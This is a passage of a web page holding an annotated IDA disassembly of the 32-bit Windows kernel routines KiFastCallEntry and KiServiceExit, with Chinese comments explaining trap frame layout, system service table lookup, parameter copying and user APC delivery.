共0x210字节</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// 也就是 KTHREAD 堆栈的是这样的：</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// - TrapFrame（共0x8c字节） + 浮点寄存器（共0x210字节） == 0x29C</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// - KTHREAD.InitialStack = 指向 TrapFrame + 浮点寄存器，【栈底】</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A56E                 push    <span class="number">1</span>               <span class="comment">// _KTRAP_FRAME.PreviousPreviousMode = 1，表示从3环来</span></span><br><span class="line">.text:<span class="number">0046</span>A570                 sub     esp, <span class="number">48</span>h        <span class="comment">// esp0 指向_TrapFrame首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A573                 sub     ebp, <span class="number">29</span>Ch       <span class="comment">// esp0 = ebp0 = _KTRAP_FRAME首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A579                 mov     [esi+_KTHREAD.PreviousMode], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A580                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">0046</span>A582                 jnz     <span class="keyword">short</span> loc_46A511 <span class="comment">// esp0 != ebp0，跳到异常处理即 INT 6，6号异常中断--无效操作码</span></span><br><span class="line">.text:<span class="number">0046</span>A584                 <span class="keyword">and</span>     [ebp+_KTRAP_FRAME.Dr7], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A588                 test    [esi+_KTHREAD.DebugActive], <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A58C                 mov     [esi+_KTHREAD.TrapFrame], ebp <span class="comment">// _KTHREAD.TrapFrame = ebp 存起来</span></span><br><span class="line">.text:<span class="number">0046</span>A592                 jnz     Dr_FastCallDrSave <span class="comment">// DebugActive != -1，就表示被调试，会把Dr0-Dr7存到TrapFrame结构体中</span></span><br><span class="line">.text:<span class="number">0046</span>A592                                         <span class="comment">// 如果当前的线程处于调试状态，那么这里面的值不为零</span></span><br><span class="line">.text:<span class="number">0046</span>A598</span><br><span class="line">.text:<span class="number">0046</span>A598 loc_46A598:                             <span class="comment">// CODE XREF: Dr_FastCallDrSave+10↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A598                                         <span class="comment">// Dr_FastCallDrSave+7C↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A598                 mov     ebx, [ebp+_KTRAP_FRAME._Ebp] <span class="comment">// ebx == ebp3，但是在本函数内，并没有对ebp3进行赋值处理</span></span><br><span class="line">.text:<span class="number">0046</span>A59B                 mov     edi, [ebp+_KTRAP_FRAME._Eip] <span class="comment">// edi = eip3 == _KUSER_SHARED_DATA.SystemCallReturn</span></span><br><span class="line">.text:<span class="number">0046</span>A59E                 mov     [ebp+_KTRAP_FRAME.DbgArgPointer], edx <span class="comment">// edx 指向 3 环的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5A1                 mov     [ebp+_KTRAP_FRAME.DbgArgMark], <span class="number">0B</span>ADB0D00h</span><br><span class="line">.text:<span class="number">0046</span>A5A8                 mov     [ebp+_KTRAP_FRAME.DbgEbp], ebx</span><br><span class="line">.text:<span class="number">0046</span>A5AB                 mov     [ebp+_KTRAP_FRAME.DbgEip], edi</span><br><span class="line">.text:<span class="number">0046</span>A5AE                 sti</span><br><span class="line">.text:<span class="number">0046</span>A5AF</span><br><span class="line">.text:<span class="number">0046</span>A5AF loc_46A5AF:                             <span class="comment">// CODE XREF: _KiBBTUnexpectedRange+18↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// _KiSystemService+72↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                 mov     edi, eax        <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// 下面开始是 KiSystemService 和 KiFastCallEntry 的汇聚点</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - esp = ebp = _KTRAP_FRAME首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - edx == 指向3环参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - eax == 系统服务号</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A5B1                 shr     edi, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                 <span class="keyword">and</span>     edi, <span class="number">30</span>h        <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 取系统服务号的 bit12,bit13== 0。</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 即00bit13bit12 xxxx &amp; 0011 0000 == 0001 0000/0000 0000</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 结果为：0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5B7                 mov     ecx, edi</span><br><span class="line">.text:<span class="number">0046</span>A5B9                 add     edi, [esi+_KTHREAD.ServiceTable] <span class="comment">// 取 SSDT/SSDT Shadow 表</span></span><br><span class="line">.text:<span class="number">0046</span>A5BF                 mov     ebx, eax</span><br><span class="line">.text:<span class="number">0046</span>A5C1                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFh      <span class="comment">// 取系统服务号的低 12 位，即在SST函数表的索引号</span></span><br><span class="line">.text:<span class="number">0046</span>A5C6                 cmp     eax, [edi+<span class="number">8</span>]    <span class="comment">// 系统调用号 - SST.ServiceLimit，判断函数是否在表的范围内</span></span><br><span class="line">.text:<span class="number">0046</span>A5C9                 jnb     _KiBBTUnexpectedRange <span class="comment">// 系统调用号 &gt;= SST.ServiceLimit，不在表里，跳转异常处理</span></span><br><span class="line">.text:<span class="number">0046</span>A5CF                 cmp     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A5D2                 jnz     <span class="keyword">short</span> loc_46A5EF <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5D4                 mov     ecx, large fs:_KPCR.NtTib.Self</span><br><span class="line">.text:<span class="number">0046</span>A5DB                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A5DD</span><br><span class="line">.text:<span class="number">0046</span>A5DD loc_46A5DD:                             <span class="comment">// DATA XREF: _KiTrap0E+117↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A5DD                 <span class="keyword">or</span>      ebx, [ecx+<span class="number">0F</span>70h]</span><br><span class="line">.text:<span class="number">0046</span>A5E3                 jz      <span class="keyword">short</span> loc_46A5EF <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5E5                 push    edx</span><br><span class="line">.text:<span class="number">0046</span>A5E6                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A5E7                 call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:<span class="number">0046</span>A5ED                 pop     eax</span><br><span class="line">.text:<span class="number">0046</span>A5EE                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5EF loc_46A5EF:                             <span class="comment">// CODE XREF: _KiFastCallEntry+B2↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// _KiFastCallEntry+C3↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                 inc     large dword ptr fs:_KPCR.PrcbData.KeSystemCalls <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5F6                 mov     esi, edx        <span class="comment">// edx 指向3环 API 的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5F8                 mov     ebx, [edi+<span class="number">0</span>Ch]  <span class="comment">// ebx 指向 SST 的参数表，ebx = SST.ArgmentTable</span></span><br><span class="line">.text:<span class="number">0046</span>A5FB                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0046</span>A5FD                 mov     cl, [eax+ebx]   <span class="comment">// ecx = SST.ArgmentTable + 系统调用号低12位*1，即ecx = 函数参数大小</span></span><br><span class="line">.text:<span class="number">0046</span>A600                 mov     edi, [edi]      <span class="comment">// edi = SST.ServiceTable = KeServiceDescriptorTable</span></span><br><span class="line">.text:<span class="number">0046</span>A602                 mov     ebx, [edi+eax*<span class="number">4</span>] <span class="comment">// ebx = SST.ServiceTable + 系统调用号低12位*4 = 函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A605                 sub     esp, ecx        <span class="comment">// 0环抬高栈顶，马上将3环参数复制到0环</span></span><br><span class="line">.text:<span class="number">0046</span>A607                 shr     ecx, <span class="number">2</span>          <span class="comment">// ecx = 参数个数 = 参数大小/4，作为拷贝的次数（一次拷贝4字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A60A                 mov     edi, esp</span><br><span class="line">.text:<span class="number">0046</span>A60C                 cmp     esi, ds:_MmUserProbeAddress</span><br><span class="line">.text:<span class="number">0046</span>A612                 jnb     loc_46A7C0</span><br><span class="line">.text:<span class="number">0046</span>A618</span><br><span class="line">.text:<span class="number">0046</span>A618 loc_46A618:                             <span class="comment">// CODE XREF: _KiFastCallEntry+2A4↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// DATA XREF: _KiTrap0E+10D↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A618                 rep movsd               <span class="comment">// 可以得知：当前函数的堆栈（也是当前线程的堆栈）从栈顶到栈底的分布情况：</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 1. 从3环拷贝过来的3环API参数</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 2. Trapframe（共0x8C字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 3. 浮点寄存器（共0x210字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                 call    ebx             <span class="comment">// ==========</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 此时：</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 1、esp 指向拷贝过来的3环API的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 2、ebp = 当前函数堆栈中 _KTRAP_FRAME 的首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 3、ebx = 系统服务函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 4、edx：指向3环地址，即 API 的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 5、eax = 系统服务号的低 12 位</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 6、edi = 指向拷贝过来的3环API的最后一个参数（0环堆栈）</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 7、esi = 指向3环API的最后一个参数（3环堆栈），esi = edx + ecx*4</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 8、ecx = 3环 NT* API 函数的参数个数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// ==========</span></span><br><span class="line">.text:<span class="number">0046</span>A61C</span><br><span class="line">.text:<span class="number">0046</span>A61C loc_46A61C:                             <span class="comment">// CODE XREF: _KiFastCallEntry+2AF↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A61C                                         <span class="comment">// DATA XREF: _KiTrap0E+12D↓o ...</span></span><br><span class="line">.text:<span class="number">0046</span>A61C                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">0046</span>A61E</span><br><span class="line">.text:<span class="number">0046</span>A61E loc_46A61E:                             <span class="comment">// CODE XREF: _KiBBTUnexpectedRange+38↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A61E                                         <span class="comment">// _KiBBTUnexpectedRange+43↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A61E                 mov     ecx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+_KTRAP_FRAME._Edx] <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 在ROS P24 有这样的代码：</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// Save the old trap frame pointer where EDX would be saved</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov ebx, [esi+KTHREAD_TRAP_FRAME]     //KTHREAD 结构中的指针 TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov [ebp+KTRAP_FRAME_EDX], ebx        //暂时保存在这里</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 这是因为：加入一个线程多次从R3--&gt;R0--&gt;R3--&gt;R0，每一次进来R0都会构建一个新</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 的TrapFrame结构在当前线程堆栈里面，那么可以使用当前KTRAP_FRAME_EDX来保存上一个</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// TrapFrame，因为这一操作是在下面的指令前进行的操作：</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov [esi+_KTHREAD.TrapFrame], ebp</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+_KTHREAD.TrapFrame], edx</span><br><span class="line">.text:<span class="number">0046</span>A628 _KiFastCallEntry endp</span><br><span class="line">.text:<span class="number">0046</span>A628</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// 可以看到这个函数是 KiFastCallEntry 函数的一部分，紧接着这个函数的</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E _KiServiceExit  proc near               <span class="comment">// CODE XREF: KiCallUserMode(x,x)+EC↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A62E                                         <span class="comment">// _KiSetLowWaitHighThread+80↓j ...</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_C           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_40          = dword ptr  <span class="number">44</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_44          = dword ptr  <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_48          = dword ptr  <span class="number">4</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_60          = dword ptr  <span class="number">64</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_64          = dword ptr  <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_68          = dword ptr  <span class="number">6</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_6C          = dword ptr  <span class="number">70</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// FUNCTION CHUNK AT .text:0046A738 SIZE 00000088 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E                 cli</span><br><span class="line">.text:<span class="number">0046</span>A62F                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// 判断是否是虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A636                 jnz     <span class="keyword">short</span> loc_46A63E <span class="comment">// 是虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A638                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                 jz      <span class="keyword">short</span> loc_46A694 <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63E</span><br><span class="line">.text:<span class="number">0046</span>A63E loc_46A63E:                             <span class="comment">// CODE XREF: _KiServiceExit+8↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// _KiServiceExit+64↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                 mov     ebx, large fs:<span class="number">124</span>h <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 从3环退出前，只要还有3环APC还没执行，就会不断的循环去执行</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 虽然在 KiDeliverApc 中一次只会执行一个用户APC，但是</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 本函数这里是一个循环</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A645                 mov     [ebx+_KTHREAD.Alerted], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A649                 cmp     [ebx+_KTHREAD.ApcState.UserApcPending], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                 jz      <span class="keyword">short</span> loc_46A694 <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A64F                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">0046</span>A651                 mov     [ebx+_KTRAP_FRAME._Eax], eax</span><br><span class="line">.text:<span class="number">0046</span>A654                 mov     [ebx+_KTRAP_FRAME.SegFs], <span class="number">3B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A65B                 mov     [ebx+_KTRAP_FRAME.SegDs], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A662                 mov     [ebx+_KTRAP_FRAME.SegEs], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A669                 mov     [ebx+_KTRAP_FRAME.SegGs], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A670                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A675                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A67B                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A67C                 sti</span><br><span class="line">.text:<span class="number">0046</span>A67D                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A67E                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A680                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A682                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// VOID KiDeliverApc (</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN KPROCESSOR_MODE PreviousMode,</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN PKEXCEPTION_FRAME ExceptionFrame,</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN PKTRAP_FRAME TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">0046</span>A687                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A688                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A68E                 mov     eax, [ebx+_KTRAP_FRAME._Eax]</span><br><span class="line">.text:<span class="number">0046</span>A691                 cli</span><br><span class="line">.text:<span class="number">0046</span>A692                 jmp     <span class="keyword">short</span> loc_46A63E <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 从3环退出前，只要还有3环APC还没执行，就会不断的循环去执行</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 虽然在 KiDeliverApc 中一次只会执行一个用户APC，但是</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 本函数这里是一个循环</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A694 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A694</span><br><span class="line">.text:<span class="number">0046</span>A694 loc_46A694:                             <span class="comment">// CODE XREF: _KiServiceExit+E↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// _KiServiceExit+1F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A694                 mov     edx, [esp+_KTRAP_FRAME.ExceptionList] <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A698                 mov     ebx, large fs:_KPCR.DebugActive <span class="comment">// 如果当前的线程处于调试状态，那么这里面的值不为-1</span></span><br><span class="line">.text:<span class="number">0046</span>A69F                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0046</span>A6A6                 mov     ecx, [esp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0046</span>A6AA                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0046</span>A6B1                 mov     [esi+_KTHREAD.PreviousMode], cl</span><br><span class="line">.text:<span class="number">0046</span>A6B7                 test    ebx, <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A6BD                 jnz     <span class="keyword">short</span> loc_46A738 <span class="comment">// 异常链表非空，有异常需要处理</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF</span><br><span class="line">.text:<span class="number">0046</span>A6BF loc_46A6BF:                             <span class="comment">// CODE XREF: _KiServiceExit+11A↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF                                         <span class="comment">// _KiServiceExit+149↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF                 test    [esp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A6C7                 jnz     loc_46AFD8      <span class="comment">// 虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A6CD                 test    word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">0F</span>FF8h</span><br><span class="line">.text:<span class="number">0046</span>A6D4                 jz      loc_46A78E      <span class="comment">// CS最低位为0，说明先前模式是0</span></span><br><span class="line">.text:<span class="number">0046</span>A6DA                 cmp     word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">1B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A6E0                 bt      word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">0</span> <span class="comment">// CF位置1</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                 cmc                     <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// CF取反，则 CF == 0</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// https://blog.csdn.net/xiong_xin/article/details/103665440</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A6E8                 ja      loc_46A77C      <span class="comment">// CF ∨ ZF = 0 时跳转</span></span><br><span class="line">.text:<span class="number">0046</span>A6EE                 cmp     word ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A6F3                 jz      <span class="keyword">short</span> loc_46A6FA</span><br><span class="line">.text:<span class="number">0046</span>A6F5</span><br><span class="line">.text:<span class="number">0046</span>A6F5 loc_46A6F5:                             <span class="comment">// CODE XREF: _KiServiceExit+15B↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6F5                 lea     esp, [ebp+_KTRAP_FRAME.SegFs]</span><br><span class="line">.text:<span class="number">0046</span>A6F8                 pop     fs              <span class="comment">// 将3环的 FS 赋值给 FS 寄存器</span></span><br><span class="line">.text:<span class="number">0046</span>A6FA                 assume fs:nothing</span><br><span class="line">.text:<span class="number">0046</span>A6FA</span><br><span class="line">.text:<span class="number">0046</span>A6FA loc_46A6FA:                             <span class="comment">// CODE XREF: _KiServiceExit+C5↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A6FA                 lea     esp, [ebp+_KTRAP_FRAME._Edi]</span><br><span class="line">.text:<span class="number">0046</span>A6FD                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A6FE                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A6FF                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A700                 pop     ebp             <span class="comment">// 此时的esp指向ErrCode（+0x64）</span></span><br><span class="line">.text:<span class="number">0046</span>A701                 cmp     word ptr [esp<span class="number">-60</span>h+arg_64], <span class="number">80</span>h <span class="comment">// CS</span></span><br><span class="line">.text:<span class="number">0046</span>A708                 ja      loc_46AFF4</span><br><span class="line">.text:<span class="number">0046</span>A70E                 add     esp, <span class="number">4</span>          <span class="comment">// esp指向EIP3（+0x68）</span></span><br><span class="line">.text:<span class="number">0046</span>A711                 test    [esp<span class="number">-64</span>h+arg_64], <span class="number">1</span> <span class="comment">// cs</span></span><br><span class="line">.text:<span class="number">0046</span>A711 _KiServiceExit  endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A711</span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// ========</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 实际上，如果当前系统支持快速系统调用，那么，这条指令将</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 被修正为“jnz short _KiSystemCallExi2“。而KiSystemCallExit2 所指的代码使用 sysexit</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 指令返回用户模式。这条指令的修正工作是在 KiEnableFastSyscallReturn 函数中完成的，</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 该函数被 KiRestoreFastSyscallReturnState 调用</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 《Windows内核原理与实现》 P553</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// ========</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 _KiSystemCallExitBranch proc near       <span class="comment">// DATA XREF: KiDisableFastSyscallReturn()+9↑w</span></span><br><span class="line">.text:<span class="number">0046</span>A719                                         <span class="comment">// KiEnableFastSyscallReturn():loc_427854↑r ...</span></span><br><span class="line">.text:<span class="number">0046</span>A719                 jnz     <span class="keyword">short</span> 